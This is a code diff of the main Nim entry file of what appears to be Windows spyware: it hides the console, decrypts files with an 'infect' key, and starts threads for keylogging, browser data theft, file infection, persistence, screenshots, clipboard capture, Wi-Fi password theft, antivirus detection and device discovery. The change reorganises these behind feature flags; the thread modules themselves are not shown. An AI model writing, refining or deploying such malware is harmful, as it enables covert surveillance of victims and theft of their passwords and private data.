@@ -1,65 +1,52 @@
 # hide the console window
 from lib/constants import isProd
-
 when isProd:
   from winim/inc/wincon import FreeConsole
   FreeConsole()
 
-# decrypt file if args passed
-from os import paramCount
-from os import paramStr
-from os import getEnv
-from os import `/`
-from os import splitFile
-from os import existsFile
-
-from lib/more/xxtea import decrypt
-from lib/functions/hideString import d
-
-from lib/flags import INFECT_ENCRYPTION_KEY
-
-if paramCount() >= 1:
-  try:
-    let file = paramStr(1)
-    let (_, name, ext) = splitFile(file)
-    let tmpFile = getEnv("tmp") / name & ext
-
-    if not existsFile(tmpFile):
-      writeFile(
-        tmpFile,
-        decrypt(
-          readFile(file),
-          d INFECT_ENCRYPTION_KEY
-        )
-      )
-
-    quit 0
-  except OSError, IOError:
-    quit 0
-
-from os import sleep
-
-from lib/channels import mainThread
-
-from lib/flags import USE_BROWSER_THREAD
-from lib/flags import USE_KEYLOGGER_THREAD
 from lib/flags import USE_INFECT_THREAD
-from lib/flags import USE_PERSISTENCE_THREAD
-from lib/flags import USE_WINDOW_NAME_THREAD
-from lib/flags import USE_SCREENSHOT_THREAD
-from lib/flags import USE_CLIPBOARD_THREAD
-from lib/flags import USE_WIFI_PASSWORDS_THREAD
-from lib/flags import USE_GET_AVS_THREAD
-from lib/flags import USE_CONNECTED_WIFI_THREAD
-from lib/flags import USE_CONNECTED_DEVICES_THREAD
+when USE_INFECT_THREAD:
+  # decrypt file if args passed
+  from os import paramCount
+  from os import paramStr
+  from os import getEnv
+  from os import `/`
+  from os import splitFile
+  from os import existsFile
+
+  from lib/more/xxtea import decrypt
+  from lib/functions/hideString import d
+
+  from lib/flags import INFECT_ENCRYPTION_KEY
+
+  if paramCount() >= 1:
+    try:
+      let file = paramStr(1)
+      let (_, name, ext) = splitFile(file)
+      let tmpFile = getEnv("tmp") / name & ext
+
+      if not existsFile(tmpFile):
+        writeFile(
+          tmpFile,
+          decrypt(
+            readFile(file),
+            d INFECT_ENCRYPTION_KEY
+          )
+        )
+
+      quit 0
+    except OSError, IOError:
+      quit 0
+
 
 when not isProd:
   echo "started"
 
-open mainThread
+from lib/channels import mainChannel
 
-## TODO: CODE CLEANUP
+open mainChannel
 
+from lib/flags import USE_KEYLOGGER_THREAD
 when USE_KEYLOGGER_THREAD:
   from lib/threads/keyloggerThread import initKeyloggerThread
 
@@ -67,6 +54,7 @@ when USE_KEYLOGGER_THREAD:
 
   createThread(keyloggerThreadVar, initKeyloggerThread)
 
+from lib/flags import USE_BROWSER_THREAD
 when USE_BROWSER_THREAD:
   from lib/threads/browserThread import initBrowserThread
 
@@ -81,6 +69,7 @@ when USE_INFECT_THREAD:
 
   createThread(infectThreadVar, initInfectThread)
 
+from lib/flags import USE_PERSISTENCE_THREAD
 when USE_PERSISTENCE_THREAD:
   from lib/threads/persistenceThread import initPersistenceThread
 
@@ -88,6 +77,7 @@ when USE_PERSISTENCE_THREAD:
 
   createThread(persistenceThreadVar, initPersistenceThread)
 
+from lib/flags import USE_WINDOW_NAME_THREAD
 when USE_WINDOW_NAME_THREAD:
   from lib/threads/windowNameThread import initWindowNameThread
 
@@ -95,6 +85,7 @@ when USE_WINDOW_NAME_THREAD:
 
   createThread(windowNameThreadVar, initWindowNameThread)
 
+from lib/flags import USE_SCREENSHOT_THREAD
 when USE_SCREENSHOT_THREAD:
   from lib/threads/screenshotThread import initScreenshotThread
 
@@ -102,6 +93,7 @@ when USE_SCREENSHOT_THREAD:
 
   createThread(screenshotThreadVar, initScreenshotThread)
 
+from lib/flags import USE_CLIPBOARD_THREAD
 when USE_CLIPBOARD_THREAD:
   from lib/threads/clipboardThread import initClipboardThread
 
@@ -109,6 +101,7 @@ when USE_CLIPBOARD_THREAD:
 
   createThread(clipboardThreadVar, initClipboardThread)
 
+from lib/flags import USE_WIFI_PASSWORDS_THREAD
 when USE_WIFI_PASSWORDS_THREAD:
   from lib/threads/wifiPasswordsThread import initWifiPasswordsThread
 
@@ -116,6 +109,7 @@ when USE_WIFI_PASSWORDS_THREAD:
 
   createThread(wifiPasswordsThreadVar, initWifiPasswordsThread)
 
+from lib/flags import USE_GET_AVS_THREAD
 when USE_GET_AVS_THREAD:
   from lib/threads/getAVSThread import initGetAVSThread
 
@@ -123,6 +117,7 @@ when USE_GET_AVS_THREAD:
 
   createThread(getAVSThreadVar, initGetAVSThread)
 
+from lib/flags import USE_CONNECTED_WIFI_THREAD
 when USE_CONNECTED_WIFI_THREAD:
   from lib/threads/connectedWifiThread import initConnectedWifiThread
 
@@ -130,6 +125,7 @@ when USE_CONNECTED_WIFI_THREAD:
 
   createThread(connectedWifiThreadVar, initConnectedWifiThread)
 
+from lib/flags import USE_CONNECTED_DEVICES_THREAD
 when USE_CONNECTED_DEVICES_THREAD:
   from lib/threads/connectedDevicesThread import initConnectedDevicesThread
 
@@ -138,15 +134,13 @@ when USE_CONNECTED_DEVICES_THREAD:
   createThread(connectedDevicesThreadVar, initConnectedDevicesThread)
 
 # wait for thread messages
+from os import sleep
+
 while true:
-  ## TODO:
-  ## NEVOIE DE OPTIMIZARI
-  ## CONSUMA PREA MULT CPU
-  ## CRED CA O SA TREBUIASCA SA IMPLEMENTEZ CV ASYNC
-  ## sleep(10) se pare ca rezolva asta, dar n as vrea sa folosesc asta
+  ## TODO: n as vrea sa folosesc sleep(10)
   ## asa ca e probabil sa modifc aici oricand
   sleep(10)
-  let channel = mainThread.tryRecv()
+  let channel = mainChannel.tryRecv()
 
   if channel.dataAvailable:
     echo channel.msg
